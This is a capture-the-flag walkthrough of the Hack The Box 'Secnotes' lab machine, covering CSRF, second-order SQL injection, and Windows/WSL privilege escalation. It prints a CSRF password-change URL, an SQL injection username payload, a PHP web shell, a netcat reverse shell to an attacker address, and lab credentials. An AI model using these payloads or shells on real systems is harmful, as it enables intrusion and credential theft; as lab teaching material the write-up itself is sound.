---
title: "Hack The Box - Secnotes"
tags: [windows,medium,csrf , second order sqli , smbclient , aspx webshell , php webshell , ubuntu wsl]
categories: HackTheBox-Windows
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled.png)

### NMAP

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%201.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%202.png)

### Enumerating Web

⇒ We have an login page. We tried SQLi but didn't succeed :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%203.png)

⇒ We registered as an dummy user :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%204.png)

→ We see that there's an user named tyler

→ We see that we can create a note

→ There's an contact form.

## Exploiting Site

### ⇒ Method 1 : CSRF

→ We started listener on port 80 and sent the link in contact us message and the user clicks on the link.

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%205.png)

⇒ We can perform CSRF to make the user change his password 

→ Intercepted the password change request and changed it to GET

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%206.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%207.png)

[http://10.10.10.97/change_pass.php?password=enox123&confirm_password=enox123&submit=submit](http://10.10.10.97/change_pass.php?password=enox123&confirm_password=enox123&submit=submit)

→ We sent the url in the message body and logged in as taylor.

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%208.png)

### ⇒ Method 2 : Second Order SQLi

→ We register with username :

**`test' or 1=1-- -`**

→ When we login we are able to read all the notes. This is happening because of the following query :

**`SELECT * FROM notes WHERE user = 'test' OR 1=1`**

⇒ We found SMB Credentials in the notes :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%209.png)

`tyler : 92g!mA8BGjOirkL%OG*&`

⇒ We enumerated SMB and found out that we have read and write access to files on the website running on port **`8808`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2010.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2011.png)

→ We can write files

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2012.png)

⇒ We uploaded php script to allow us to execute commands on the system :

```php
<?php
if (isset($_REQUEST['fexec'])) {
  echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
};
?>
```

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2013.png)

⇒ Uploaded nc.exe and popped a shell :

**`.\nc.exe 10.10.14.4 1234 -e cmd.exe`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2014.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2014.png)

## Privilege Escalation

⇒ We see that its running Ubuntu WSL :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2015.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2015.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2016.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2016.png)

⇒ We ran bash and got access to the WSL :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2017.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2017.png)

→ In bash_history we find credentials for Administrator user :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2018.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Secnotes%20Box%20a2ae5f9879d94165b8a8804d563ef169/Untitled%2018.png)

⇒ Used psexec with the password and got root :

**`psexec.py administrator@10.10.10.97`**

